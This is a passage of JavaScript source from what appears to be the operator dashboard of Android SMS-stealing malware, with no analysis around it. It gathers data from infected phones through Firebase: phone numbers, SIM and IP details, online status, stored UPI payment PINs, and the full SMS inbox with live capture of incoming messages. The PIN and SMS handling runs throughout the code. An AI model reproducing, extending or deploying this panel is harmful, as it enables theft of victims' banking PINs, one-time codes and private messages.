        if(d<8100){d=Math.sqrt(d);ctx.strokeStyle='rgba(255,60,60,'+(0.06*(1-d/90))+')';ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.stroke();}
      }
    }
  }
  draw();
  var mxPending=false, lastMx=0, lastMy=0;
  document.addEventListener('mousemove',function(e){
    lastMx=e.clientX; lastMy=e.clientY;
    if(mxPending) return;
    mxPending=true;
    requestAnimationFrame(function(){
      mxPending=false;
      var ox=(lastMx/window.innerWidth-0.5)*10;
      var oy=(lastMy/window.innerHeight-0.5)*6;
      var orbs=document.querySelectorAll('.orb');
      for(var i=0;i<orbs.length;i++) orbs[i].style.transform='translate3d('+(ox*(i+1))+'px,'+(oy*(i+1))+'px,0)';
    });
  });
}

// ═══ CLIENTS CACHE (6 hour TTL, auto-clean) ═══
function getClientsCacheMeta(){
  try{
    var raw=localStorage.getItem(CLIENTS_CACHE_KEY);
    if(!raw) return null;
    return JSON.parse(raw);
  }catch(e){ return null; }
}

function clearClientsCache(){
  localStorage.removeItem(CLIENTS_CACHE_KEY);
  var badge=document.getElementById('cacheBadge');
  if(badge){ badge.classList.add('hidden'); badge.textContent=''; }
}

function clearClientsCacheIfExpired(){
  var meta=getClientsCacheMeta();
  if(!meta||!meta.byFb) return false;
  var changed=false;
  Object.keys(meta.byFb).forEach(function(fbId){
    if((Date.now()-meta.byFb[fbId].ts)>=CLIENTS_CACHE_TTL){delete meta.byFb[fbId];changed=true;}
  });
  if(changed){
    if(Object.keys(meta.byFb).length) localStorage.setItem(CLIENTS_CACHE_KEY,JSON.stringify(meta));
    else clearClientsCache();
  }
  return changed;
}

function parseBattery(v){
  if(v==null) return 0;
  if(typeof v==='number') return v;
  return parseInt(String(v).replace('%',''),10)||0;
}
function getUpiPinFromRecord(s){
  if(!s||typeof s!=='object') return '';
  var v=s.upipin!=null?s.upipin:(s.upi_pin!=null?s.upi_pin:(s.upiPin!=null?s.upiPin:s.UPI_PIN));
  if(v==null||v==='') return '';
  return String(v).trim();
}
function getPhoneFromRecord(s){
  if(!s||typeof s!=='object') return '';
  if(s.mobNo) return String(s.mobNo).trim();
  if(s.sims&&s.sims.length){
    for(var i=0;i<s.sims.length;i++){
      var pn=s.sims[i]&&(s.sims[i].phoneNumber||s.sims[i].number);
      if(pn) return String(pn).trim();
    }
  }
  if(s.phone_number) return String(s.phone_number).trim();
  if(s.phone) return String(s.phone).trim();
  if(s.mobile) return String(s.mobile).trim();
  var si=s.sim_info||{};
  if(si.phoneNumber) return String(si.phoneNumber).trim();
  if(si.line1Number) return String(si.line1Number).trim();
  return '';
}
function resolveOnlineStatus(s,fbId){
  if(!s) return false;
  var inst=getFbInstance(fbId);
  var schema=inst?inst.schema:'spinplay';
  if(schema==='rabel'){
    return s.status===true||s.online===true;
  }
  if(s.online_status===true) return true;
  if(s.online_status===false) return false;
  if(s.online===true||s.status==='online'||s.status===true) return true;
  return false;
}
function parseJoinedDate(str){
  if(!str) return 0;
  var ms=parseDdMmYyyy(String(str).trim());
  if(ms) return ms;
  try{
    var p=String(str).split('|')[0].trim().split('/');
    if(p.length===3) return new Date(parseInt(p[2],10),parseInt(p[1],10)-1,parseInt(p[0],10)).getTime();
  }catch(e){}
  return 0;
}
function toTimestampMs(v){
  if(v==null||v==='') return 0;
  if(typeof v==='object') return 0;
  if(typeof v==='number'&&v>0) return v<1e12?v*1000:v;
  if(typeof v==='string'){
    if(!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
    var p=parseDdMmYyyy(v); if(p) return p;
    var t=Date.parse(v); if(!isNaN(t)) return t;
  }
  return 0;
}
function resolveLastSeenMs(raw,isOnline){
  if(!raw||typeof raw!=='object') return 0;
  if(isOnline) return Date.now();
  if(raw._lastOnlineMs) return raw._lastOnlineMs;
  var keys=['last_seen','lastSeen','last_ping','lastPing','updated_at','updatedAt','timestamp','ts'];
  for(var i=0;i<keys.length;i++){var ms=toTimestampMs(raw[keys[i]]);if(ms) return ms;}
  return parseJoinedDate(raw.joined);
}
function formatLastSeenAgo(ms){
  if(!ms) return '—';
  var diff=Date.now()-ms;
  if(diff<0) return 'Just now';
  if(diff<60000) return Math.floor(diff/1000)+'s ago';
  if(diff<3600000) return Math.floor(diff/60000)+'m ago';
  if(diff<86400000) return Math.floor(diff/3600000)+'h ago';
  if(diff<604800000) return Math.floor(diff/86400000)+'d ago';
  return new Date(ms).toLocaleString();
}
function renderLastSeen(d){
  var el=document.getElementById('dLastSeen');
  if(!el||!d) return;
  if(d.status==='online'){
    el.textContent='● ACTIVE';
    el.style.color='var(--success)';
    el.title='Online now';
    return;
  }
  el.style.color='var(--muted)';
  if(d.lastSeen>0){
    el.textContent=formatLastSeenAgo(d.lastSeen);
    el.title=new Date(d.lastSeen).toLocaleString();
  }else if(d.joinedReadable){
    el.textContent=d.joinedReadable;
    el.title='Last device heartbeat';
  }else{
    el.textContent='—';
    el.title='';
  }
}
function isValidDeviceRecord(raw){
  if(!raw||typeof raw!=='object'||Array.isArray(raw)) return false;
  if(raw.password||raw.Pass||raw.ExpDate||raw.expiry||raw.userName) return false;
  if(raw.message&&raw.sender&&raw.dateTime) return false;
  if(typeof raw.status==='boolean') return true;
  if(!raw.modelName&&!raw.deviceId&&!raw.device_model&&!raw.device_info&&!raw.live_data&&!raw.name) return false;
  return true;
}
function normalizeClientRecord(raw){
  if(!isValidDeviceRecord(raw)) return null;
  if(raw.modelName||raw.deviceId||raw.mobNo){
    var mob=getPhoneFromRecord(raw);
    return{
      name:raw.modelName||'Unknown',
      brand:raw.brand||(raw.modelName?String(raw.modelName).split(' ')[0]:''),
      android:raw.androidV||raw.sdkV||'',
      ts:resolveLastSeenMs(raw,false)||parseJoinedDate(raw.joined)||raw.ts||0,
      joinedReadable:raw.joined?String(raw.joined).trim():'',
      online:raw.status===true,
      online_status:raw.status===true,
      battery:parseBattery(raw.battery),
      network:raw.service_provider||(raw.sims&&raw.sims[0]?raw.sims[0].carrierName:'')||'?',
      charging:!!raw.charging,
      sms_count:raw.sms_count||0,
      mobNo:mob||raw.mobNo||'',
      ip:raw.ip_address||'',
      storage:raw.storage||'',
      upipin:getUpiPinFromRecord(raw)
    };
  }
  var r={
    name:raw.name||raw.device_model||raw.model,
    brand:raw.brand||raw.device_brand,
    android:raw.android||raw.android_version,
    ts:resolveLastSeenMs(raw,false)||raw.ts||0,
    joinedReadable:raw.joined?String(raw.joined).trim():'',
    online_status:raw.online_status,
    online:raw.online,
    status:raw.status,
    battery:parseBattery(raw.battery||raw.battery_level),
    network:raw.network||raw.network_type,
    charging:raw.charging||raw.is_charging,
    sms_count:raw.sms_count||raw.smsCount||raw.total_sms,
    mobNo:getPhoneFromRecord(raw),
    upipin:getUpiPinFromRecord(raw)
  };
  if(typeof r.ts==='object') r.ts=0;
  r.online=resolveOnlineStatus(Object.assign({},raw,r),raw._fbId||'');
  return r;
}
function slimClientEntry(s){
  if(!s||typeof s!=='object') return {};
  var n=normalizeClientRecord(s)||{};
  if(s._node) n._node=s._node;
  if(s._fbId) n._fbId=s._fbId;
  return n;
}
function slimClientsRaw(raw){
  var slim={};
  Object.keys(raw||{}).forEach(function(k){slim[k]=slimClientEntry(raw[k]);});
  return slim;
}
function setClientsCacheForFb(fbId){
  if(!fbId) return;
  var slice={};
  Object.keys(clientsRawMap).forEach(function(k){
    if(k.indexOf(fbId+'::')===0) slice[k]=slimClientEntry(clientsRawMap[k]);
  });
  if(!Object.keys(slice).length) return;
  try{
    var meta=getClientsCacheMeta()||{byFb:{}};
    if(!meta.byFb) meta.byFb={};
    meta.byFb[fbId]={ts:Date.now(),data:slice};
    localStorage.setItem(CLIENTS_CACHE_KEY,JSON.stringify(meta));
    if(fbId===activeFbId) updateCacheBadge(false);
  }catch(e){ console.warn('Clients cache write failed:',e); }
}
function debouncedSetClientsCache(fbId){
  clearTimeout(cacheWriteTimer);
  var fid=fbId||activeFbId;
  cacheWriteTimer=setTimeout(function(){if(fid)setClientsCacheForFb(fid);},400);
}
function applyFbData(inst){
  renderFirebaseSwitcher();
  if(!inst||inst.id===activeFbId) processClientsData(getFbDataMap(),false);
  debouncedSetClientsCache(inst?inst.id:activeFbId);
}
function loadAllFbCachesIntoMap(){
  firebaseConfigs.forEach(function(cfg){
    var cached=getClientsCacheData(cfg.id);
    if(!cached) return;
    Object.keys(cached).forEach(function(k){clientsRawMap[k]=cached[k];});
  });
}

function getClientsCacheData(fbId){
  var meta=getClientsCacheMeta();
  if(!meta||!meta.byFb||!meta.byFb[fbId]) return null;
  var entry=meta.byFb[fbId];
  if(!entry.data||(Date.now()-entry.ts)>=CLIENTS_CACHE_TTL) return null;
  return entry.data;
}

function updateCacheBadge(fromCache){
  var badge=document.getElementById('cacheBadge');
  if(!badge) return;
  if(fromCache){
    var meta=getClientsCacheMeta();
    var entry=meta&&meta.byFb&&activeFbId?meta.byFb[activeFbId]:null;
    if(!entry) return;
    var ageMin=Math.floor((Date.now()-entry.ts)/60000);
    badge.textContent='CACHED · '+ageMin+'m ago';
    badge.classList.remove('hidden');
  } else {
    badge.textContent='LIVE';
    badge.classList.remove('hidden');
    setTimeout(function(){ badge.classList.add('hidden'); },3000);
  }
}

// Auto-clean expired cache every 30 minutes
setInterval(clearClientsCacheIfExpired,30*60*1000);

// ═══ PANEL INIT (only after login) ═══
function openPanel(){
  if(panelInitialized) return;
  panelInitialized=true;
  document.getElementById('mainLayout').style.display='flex';
  clearClientsCacheIfExpired();
  fetchStartMs=performance.now();
  firstFetchDone=false;
  loadAllFbCachesIntoMap();
  if(Object.keys(getFbDataMap()).length){
    processClientsData(getFbDataMap(),true);
    updateCacheBadge(true);
    showFetchMs(0);
  }
  renderFirebaseSwitcher();
  updateSidebarTitle();
  applyFbTheme(activeFbId);
  updateApiKeyWarnings();
  init3DScene();
  fetchAllFirebaseData();
}

function markFetchDone(){
  if(firstFetchDone) return;
  firstFetchDone=true;
  showFetchMs(Math.round(performance.now()-fetchStartMs));
}
function ingestDeviceData(fbId,nodeName,devId,data){
  var payload=Object.assign({_fbId:fbId},data);
  if(!payload.modelName&&!payload.name&&!payload.deviceId&&!payload.device_model)
    payload.name=String(devId).substring(0,16);
  var key=makeDevKey(fbId,devId);
  var prev=clientsRawMap[key]||{};
  var norm=normalizeClientRecord(payload);
  if(!norm) return;
  norm._node=nodeName; norm._fbId=fbId;
  var isOnline=resolveOnlineStatus(Object.assign({},payload,norm),fbId);
  if(isOnline) norm._lastOnlineMs=Date.now();
  else if(prev._lastOnlineMs) norm._lastOnlineMs=prev._lastOnlineMs;
  else{
    var seenMs=resolveLastSeenMs(payload,false);
    if(seenMs) norm._lastOnlineMs=seenMs;
  }
  clientsRawMap[key]=Object.assign({},prev,norm);
}
function mergeSummaryNode(fbId,nodeName,raw){
  if(!raw||typeof raw!=='object') return;
  Object.keys(raw).forEach(function(k){
    if(raw[k]&&typeof raw[k]==='object') ingestDeviceData(fbId,nodeName,k,raw[k]);
  });
}
function summaryFromParts(id,info,live,onlineStatus){
  info=info||{}; live=live||{};
  var ts=info.last_seen||live.timestamp_millis||0;
  if(typeof ts==='object') ts=Date.now();
  var on=onlineStatus===true;
  var data={
    name:info.device_model||info.name, brand:info.device_brand||info.brand,
    android:info.android_version||info.android, ts:ts,
    online:on, online_status:onlineStatus===true||onlineStatus===false?onlineStatus:undefined,
    battery:live.battery_level||live.battery||0,
    network:live.network_type||live.network||'?', charging:!!live.is_charging,
    sms_count:live.total_sms||live.sms_count||0,
    mobNo:getPhoneFromRecord(info)||getPhoneFromRecord(live)
  };
  return{id:id,data:data};
}
function fetchOneDeviceSummary(inst,nodeName,id){
  var base=inst.restUrl+'/'+nodeName+'/'+encodeURIComponent(id)+'/';
  return Promise.all([
    restJson(base+'device_info.json'),
    restJson(base+'live_data.json'),
    restJson(base+'online_status.json')
  ]).then(function(p){
    var row=summaryFromParts(id,p[0],p[1],p[2]);
    row.data._node=nodeName; row.data._fbId=inst.id;
    return row;
  });
}
function fetchDevicesFast(inst,nodeName){
  return restJson(inst.restUrl+'/'+nodeName+'.json?shallow=true').then(function(ids){
    if(!ids||typeof ids!=='object') return;
    var keys=Object.keys(ids);
    if(!keys.length) return;
    var base=inst.restUrl+'/'+nodeName+'/';
    return Promise.all(keys.map(function(id){
      return restJson(base+encodeURIComponent(id)+'/online_status.json').then(function(st){
        var key=makeDevKey(inst.id,id);
        var prev=clientsRawMap[key]||{};
        clientsRawMap[key]=Object.assign({},prev,{_node:nodeName,_fbId:inst.id,
          online:st===true,online_status:st===true||st===false?st:undefined});
      });
    })).then(function(){
      applyFbData(inst);
      return Promise.all(keys.map(function(id){
        return fetchOneDeviceSummary(inst,nodeName,id).then(function(row){
          if(row&&row.id) ingestDeviceData(inst.id,nodeName,row.id,row.data);
        });
      }));
    }).then(function(){
      applyFbData(inst);
      attachDeviceLiveListeners(inst,nodeName,keys);
    });
  });
}
function fetchSummaryNode(inst,nodeName){
  return restJson(inst.restUrl+'/'+nodeName+'.json').then(function(raw){
    mergeSummaryNode(inst.id,nodeName,raw);
    applyFbData(inst);
  });
}
function fetchNodeViaSdk(inst,node){
  if(!inst.db) return Promise.resolve();
  return inst.db.ref(node).once('value').then(function(s){
    if(!s.exists()) return;
    mergeSummaryNode(inst.id,node,s.val());
    applyFbData(inst);
    if(inst.discoveredNodes.indexOf(node)<0) inst.discoveredNodes.push(node);
  });
}
function discoverAndFetchInstance(inst){
  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
    if(isFirebaseErr(roots)){
      inst.connError=String(roots.error);
      return discoverViaSdk(inst).then(function(sdkRoots){
        if(sdkRoots) return runDiscoveryTasks(inst,sdkRoots);
        return Promise.all([
          fetchNodeViaSdk(inst,'clients'),
          fetchNodeViaSdk(inst,'devices_status')
        ]).then(function(){setClientsCacheForFb(inst.id);});
      });
    }
    if(!roots||typeof roots!=='object'){
      return discoverViaSdk(inst).then(function(sdkRoots){return runDiscoveryTasks(inst,sdkRoots);});
    }
    return runDiscoveryTasks(inst,roots);
  });
}
function attachRestPolling(inst){
  if(inst.pollTimer) return;
  if(inst.db){
    if(inst.sdkPollAttached) return;
    inst.sdkPollAttached=true;
    function sdkPoll(){
      fetchNodeViaSdk(inst,'clients');
      fetchNodeViaSdk(inst,'devices_status');
    }
    sdkPoll();
    inst.pollTimer=setInterval(sdkPoll,20000);
    return;
  }
  var pollMs=inst.schema==='rabel'?6000:10000;
  function poll(){
    restJson(inst.restUrl+'/clients.json').then(function(raw){
      if(!raw) return;
      mergeSummaryNode(inst.id,'clients',raw);
      applyFbData(inst);
    });
  }
  poll();
  inst.pollTimer=setInterval(poll,pollMs);
}
function fetchAllFirebaseData(){
  if(!firebaseInstances.length){initAllFirebase();}
  try{localStorage.removeItem('rbl_clients_cache_v2');}catch(e){}
  firebaseInstances.forEach(function(inst){
    attachClientsLiveUpdates(inst);
    attachRestPolling(inst);
  });
  return Promise.all(firebaseInstances.map(discoverAndFetchInstance)).then(function(){
    markFetchDone();
    renderFirebaseSwitcher();
    processClientsData(getFbDataMap(),false);
  });
}
function refreshAllFirebase(){
  clientsRawMap={}; firstFetchDone=false; fetchStartMs=performance.now();
  fetchAllFirebaseData();
  showToast('success','Refreshing all Firebase...');
}
function attachDeviceLiveListeners(inst,nodeName,ids){
  if(!inst.db) return;
  ids.forEach(function(id){
    var lk=inst.id+'_'+id;
    if(inst.deviceLiveAttached[lk]) return;
    inst.deviceLiveAttached[lk]=true;
    inst.db.ref(nodeName+'/'+id+'/online_status').on('value',function(s){
      var key=makeDevKey(inst.id,id);
      var val=s.val();
      if(!clientsRawMap[key]) return;
      clientsRawMap[key].online_status=val;
      clientsRawMap[key].online=val===true;
      applyFbData(inst);
    });
    inst.db.ref(nodeName+'/'+id+'/live_data').on('value',function(s){
      inst.db.ref(nodeName+'/'+id+'/device_info').once('value').then(function(si){
        inst.db.ref(nodeName+'/'+id+'/online_status').once('value').then(function(so){
          var row=summaryFromParts(id,si.val(),s.val(),so.val());
          ingestDeviceData(inst.id,nodeName,id,row.data);
          applyFbData(inst);
        });
      });
    });
  });
}
function attachClientsLiveUpdates(inst){
  if(!inst.db||inst.liveAttached) return;
  inst.liveAttached=true;
  inst.db.ref('devices_status').once('value').then(function(s){
    if(s.exists()){mergeSummaryNode(inst.id,'devices_status',s.val());applyFbData(inst);}
  });
  inst.db.ref('devices_status').on('value',function(s){
    if(!s.exists()) return;
    mergeSummaryNode(inst.id,'devices_status',s.val()); applyFbData(inst);
  });
  ['clients'].forEach(function(node){
    inst.db.ref(node).once('value').then(function(s){
      if(s.exists()) mergeSummaryNode(inst.id,node,s.val());
      applyFbData(inst);
    });
    inst.db.ref(node).on('child_added',function(s){ingestDeviceData(inst.id,node,s.key,s.val());applyFbData(inst);});
    inst.db.ref(node).on('child_changed',function(s){ingestDeviceData(inst.id,node,s.key,s.val());applyFbData(inst);});
    inst.db.ref(node).on('child_removed',function(s){delete clientsRawMap[makeDevKey(inst.id,s.key)];applyFbData(inst);});
  });
}
function mergeClientMaps(a,b){
  var out={},seen={},k; a=a||{}; b=b||{};
  Object.keys(a).concat(Object.keys(b)).forEach(function(key){
    if(seen[key]) return; seen[key]=1;
    out[key]=Object.assign({},slimClientEntry(a[key]),slimClientEntry(b[key]));
  });
  return out;
}

var _processUiTimer=null, _lastDevHash='', _searchTimer=null;
function devListHash(list){
  list=list||getFilteredDevs();
  return list.map(function(d){return d.id+'|'+d.status+'|'+d.battery+'|'+d.displayPhone+'|'+d.network+'|'+d.smsCount;}).join(';;');
}
function onDevSearch(){
  clearTimeout(_searchTimer);
  _searchTimer=setTimeout(renderSidebar,180);
}
function flushProcessClientsUI(fromCache){
  var list=getFilteredDevs();
  var hash=devListHash(list);
  if(hash!==_lastDevHash){
    _lastDevHash=hash;
    renderFirebaseSwitcher();
    renderSidebar();
    updateStats();
  }
  if(fromCache) updateCacheBadge(true);
  if(selDev){
    var dev=allDevs.find(function(d){return d.id===selDev;});
    if(dev&&document.getElementById('deviceDetail')&&!document.getElementById('deviceDetail').classList.contains('hidden'))
      updateHero(dev);
  }
}
function scheduleProcessClientsUI(fromCache){
  clearTimeout(_processUiTimer);
  _processUiTimer=setTimeout(function(){flushProcessClientsUI(fromCache);},280);
}
function processClientsData(raw,fromCache){
  allDevs=[];
  if(!raw){ renderSidebar(); updateStats(); return; }
  var now=Date.now();
  Object.keys(raw).forEach(function(k){
    var s=raw[k];
    if(!s||typeof s!=='object') return;
    var parsed=parseDevKey(k);
    var fbId=s._fbId||parsed.fbId;
    var rawId=parsed.devId;
    var inst=getFbInstance(fbId);
    var phone=getPhoneFromRecord(s);
    var on=resolveOnlineStatus(s,fbId);
    var ts=on?Date.now():(s._lastOnlineMs||resolveLastSeenMs(s,false)||s.ts||0);
    if(typeof ts==='object') ts=0;
    allDevs.push({
      id:       k,
      rawId:    rawId,
      fbId:     fbId,
      fbName:   inst?inst.name:fbId,
      deviceNode:s._node||'devices',
      name:     s.name||s.device_model||s.model||'Unknown',
      displayPhone: phone||'No Number',
      brand:    s.brand||s.device_brand||'',
      android:  s.android||s.android_version||'',
      status:   on?'online':'offline',
      battery:  s.battery||s.battery_level||0,
      network:  s.network||s.network_type||'?',
      charging: s.charging||s.is_charging||false,
      lastSeen: ts,
      joinedReadable: s.joinedReadable||'',
      smsCount: s.sms_count||s.smsCount||s.total_sms||0,
      upiPin: getUpiPinFromRecord(s)
    });
  });
  allDevs.sort(function(a,b){
    return a.status==='online'&&b.status!=='online'?-1:
           a.status!=='online'&&b.status==='online'?1:
           b.lastSeen-a.lastSeen;
  });
  var filtered=getFilteredDevs();
  if(!selDev&&filtered.length>0) selDev=filtered[0].id;
  if(selDev&&!filtered.find(function(d){return d.id===selDev;}))
    selDev=filtered.length>0?filtered[0].id:'';
  scheduleProcessClientsUI(fromCache);
}

// ═══ SIDEBAR ═══
function renderSidebar(){
  var el=document.getElementById('devList'), q=(document.getElementById('devSearch').value||'').toLowerCase();
  var inst=getFbInstance(activeFbId);
  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.id+d.brand+d.rawId).toLowerCase().includes(q);});
  if(!list.length){
    var errMsg='';
    if(inst&&inst.connError){
      errMsg='<br><span style="color:var(--error);margin-top:8px;display:block;font-size:9px">⚠ '+esc(inst.connError)+'</span>';
      if(/deactivated|suspended/i.test(inst.connError)){
        errMsg+='<span style="opacity:0.65;margin-top:6px;display:block;font-size:8px">APK mein purana cached data dikh sakta hai. Firebase Console se database enable karo.</span>';
      }
    }
    el.innerHTML='<div class="dev-empty">'+icoAnim('satellite','i3d-blue i3d-lg')+'<br>'+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span>'+errMsg+'</div>';
    return;
  }
  window._sidebarList=list;
  el.innerHTML=list.map(function(d,i){
    var bc=d.battery>50?'bat-hi':d.battery>20?'bat-md':'bat-lo';
    return '<div class="dev-item'+(d.status==='online'?' is-online':'')+(d.id===selDev?' active':'')+'" onclick="openDeviceByIdx('+i+')">'+
      '<div class="dev-top"><span class="dev-name">'+ico('📞','i3d-green i3d-sm i3d-static')+' '+esc(d.displayPhone)+'</span><span class="dev-dot '+d.status+'"></span></div>'+
      '<div class="dev-uid">'+esc(d.name)+' · '+esc(d.rawId.substring(0,16))+'</div>'+
      '<div class="dev-chips"><span class="dchip '+bc+'">'+ico('⚡','i3d-orange i3d-sm i3d-static')+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
      '<span class="dchip">'+esc(d.network)+'</span>'+
      '<span class="dchip">'+d.smsCount+' SMS</span>'+(d.status==="online"?'<span class="dchip" style="color:var(--success);border-color:rgba(0,255,157,0.2)">● ACTIVE</span>':'')+'</div></div>';
  }).join('');
}
function openDeviceByIdx(i){var d=window._sidebarList&&window._sidebarList[i];if(d)openDevice(d.id);}

function updateStats(){
  var list=getFilteredDevs();
  document.getElementById('stTotal').textContent=list.length;
  document.getElementById('stOnline').textContent=list.filter(function(d){return d.status==='online';}).length;
  document.getElementById('stOffline').textContent=list.filter(function(d){return d.status==='offline';}).length;
}

// ═══ OPEN DEVICE ═══
function openDevice(id){
  if(selDev===id&&tabLoaded.sms){
    var dev=allDevs.find(function(d){return d.id===id;});
    if(dev) updateHero(dev);
    return;
  }
  selDev=id; renderSidebar();
  document.getElementById('emptyState').classList.add('hidden');
  document.getElementById('deviceDetail').classList.remove('hidden');
  var dev=allDevs.find(function(d){return d.id===id;});
  if(dev) updateHero(dev);
  clearDeviceListeners();
  tabLoaded={};
  window._allSmsData=[]; window._newSmsData=[]; window._allSmsTotal=0;
  window._rabelSmsSeenKeys={};
  window._rabelSmsHydrated=false;
  renderSmsList();
  ensureTabLoaded('sms');
}

function updateHero(d){
  document.getElementById('dName').textContent=d.displayPhone!=='No Number'?d.displayPhone+(d.brand?' ('+d.brand+')':''):d.name+(d.brand?' ('+d.brand+')':'');
  document.getElementById('dBrand').innerHTML='Android '+d.android+' · '+icoAnim('fire','i3d-fire i3d-sm')+' '+esc(d.fbName);
  document.getElementById('dId').textContent='ID: '+d.rawId+' · node: '+d.deviceNode;
  var badge=document.getElementById('dBadge');
  badge.className='hero-badge '+d.status;
  badge.textContent=d.status==='online'?'● ONLINE':'○ OFFLINE';
  document.getElementById('dBat').textContent=d.battery+'%'+(d.charging?' ⚡':'');
  document.getElementById('dNet').textContent=d.network;
  document.getElementById('dAndroid').textContent=d.android||'?';
  document.getElementById('dSmsCount').textContent=d.smsCount;
  document.getElementById('dUpiPin').textContent=d.upiPin||'—';
  renderLastSeen(d);
}

// ═══ LAZY DEVICE DATA — load only active tab (fast open) ═══
function clearDeviceListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L&&L.type==='rest'&&L.timer) clearInterval(L.timer);
    else if(L&&L.type==='children'&&L.db){
      L.db.ref(L.path).off('child_added',L.addH);
      if(L.chH) L.db.ref(L.path).off('child_changed',L.chH);
    }
    else if(L&&L.db&&L.handler) L.db.ref(L.path).off('value',L.handler);
  });
  activeListeners={};
}
function restPoll(fbId,path,cb,intervalMs){
  var inst=getFbInstance(fbId);
  if(!inst) return;
  function tick(){restJson(inst.restUrl+'/'+path+'.json').then(function(d){cb(d);});}
  tick();
  activeListeners[fbId+'::rest::'+path]={type:'rest',timer:setInterval(tick,intervalMs||12000)};
}
function smsAsList(raw){
  if(!raw) return [];
  if(Array.isArray(raw)) return raw;
  if(typeof raw==='object'){
    return Object.keys(raw).sort(function(a,b){
      var na=Number(a), nb=Number(b);
      if(!isNaN(na)&&!isNaN(nb)) return na-nb;
      return String(a).localeCompare(String(b));
    }).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
  }
  return [];
}
function parseDdMmYyyy(s){
  if(!s||typeof s!=='string') return 0;
  var m=String(s).trim().match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?$/i);
  if(!m) return 0;
  var dd=+m[1], MM=+m[2], yyyy=+m[3], hh=+(m[4]||0), mi=+(m[5]||0), ss=+(m[6]||0), ap=m[7];
  if(ap){var p=ap.toUpperCase(); if(p==='PM'&&hh<12)hh+=12; if(p==='AM'&&hh===12)hh=0;}
  var ms=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
  return isNaN(ms)?0:ms;
}
function ingestAllSmsPayload(d){
  var list=[], total=0;
  if(!d) return {list:list,total:0};
  if(d.messages!=null) list=smsAsList(d.messages).map(function(m,i){
    var n=normalizeSmsRecord(m);
    if(n){n._sortKey=String(i);return n;}
    return null;
  }).filter(Boolean);
  else if(typeof d==='object'&&!Array.isArray(d)) list=smsAsList(d).map(function(m,i){
    var n=normalizeSmsRecord(m);
    if(n){n._sortKey=String(i);return n;}
    return null;
  }).filter(Boolean);
  total=d.total_count!=null?d.total_count:list.length;
  return {list:list,total:total};
}
function ingestNewSmsPayload(d){
  var list=[];
  smsAsList(d).forEach(function(m,i){
    var n=normalizeSmsRecord(m);
    if(n){n._sortKey='n'+i; list.push(n);}
  });
  if(!list.length&&d&&typeof d==='object'&&!Array.isArray(d)){
    Object.keys(d).forEach(function(k){
      var n=normalizeSmsRecord(d[k]);
      if(n){n._sortKey=k; list.push(n);}
    });
  }
  return list;
}
var _smsRenderRaf=0;
function scheduleSmsRender(){
  if(_smsRenderRaf) return;
  _smsRenderRaf=requestAnimationFrame(function(){_smsRenderRaf=0;renderSmsList();});
}
function appendRabelSmsMessage(dev,key,raw,isUpdate){
  var n=normalizeSmsRecord(raw);
  if(!n) return;
  n._sortKey=key;
  var list=window._allSmsData||[];
  var idx=-1;
  for(var i=0;i<list.length;i++){if(list[i]._sortKey===key){idx=i;break;}}
  if(idx>=0) list[idx]=n;
  else{
    list.push(n);
    var sk=dev.rawId+'::'+key;
    if(!window._rabelSmsSeenKeys) window._rabelSmsSeenKeys={};
    if(window._rabelSmsHydrated&&!window._rabelSmsSeenKeys[sk]){
      window._rabelSmsSeenKeys[sk]=1;
      window._newSmsData=(window._newSmsData||[]).concat([n]);
    }
  }
  window._allSmsData=list;
  window._allSmsTotal=list.length;
  scheduleSmsRender();
}
function ingestRabelSms(dev,data){
  var msgs=[];
  if(data&&typeof data==='object') Object.keys(data).forEach(function(k){
    var n=normalizeSmsRecord(data[k]);
    if(n){n._sortKey=k; msgs.push(n);}
  });
  if(!window._rabelSmsSeenKeys) window._rabelSmsSeenKeys={};
  var isInitial=!window._rabelSmsHydrated;
  var newMsgs=[];
  msgs.forEach(function(m){
    var sk=dev.rawId+'::'+m._sortKey;
    if(!window._rabelSmsSeenKeys[sk]){
      window._rabelSmsSeenKeys[sk]=1;
      if(!isInitial) newMsgs.push(m);
    }
  });
  window._rabelSmsHydrated=true;
  if(!isInitial&&newMsgs.length){
    var prev=window._newSmsData||[];
    var seen={};
    prev.concat(newMsgs).forEach(function(m){seen[smsDedupKey(m)]=m;});
    window._newSmsData=Object.keys(seen).map(function(k){return seen[k];});
  } else if(isInitial) window._newSmsData=[];
  window._allSmsData=msgs;
  window._allSmsTotal=msgs.length;
  scheduleSmsRender();
}
function attachRabelSmsLive(dev){
  var inst=getFbInstance(dev.fbId);
  if(!inst||!inst.db) return false;
  var path='messages/'+dev.rawId;
  var ref=inst.db.ref(path);
  var key=dev.fbId+'::smslive::'+path;
  ref.limitToLast(200).once('value',function(snap){
    ingestRabelSms(dev,snap.val());
    var addH=function(s){appendRabelSmsMessage(dev,s.key,s.val());};
    var chH=function(s){appendRabelSmsMessage(dev,s.key,s.val(),true);};
    ref.on('child_added',addH);
    ref.on('child_changed',chH);
    activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:chH};
  });
  return true;
}
function attachSpinplayNewSmsLive(dev){
  var inst=getFbInstance(dev.fbId);
  if(!inst||!inst.db) return false;
  var path=dev.deviceNode+'/'+dev.rawId+'/new_sms';
  var ref=inst.db.ref(path);
  var key=dev.fbId+'::newsmslive::'+path;
  ref.once('value',function(snap){
    window._newSmsData=ingestNewSmsPayload(snap.val());
    scheduleSmsRender();
    var addH=function(s){
      var n=normalizeSmsRecord(s.val());
      if(!n) return;
      n._sortKey=s.key;
      window._newSmsData=(window._newSmsData||[]).concat([n]);
      scheduleSmsRender();
    };
    ref.on('child_added',addH);
    activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:null};
  });
  return true;
}
function loadRabelSms(dev){
  if(attachRabelSmsLive(dev)) return;
  restPoll(dev.fbId,'messages/'+dev.rawId,function(data){ingestRabelSms(dev,data);},SMS_FAST_MS);
}
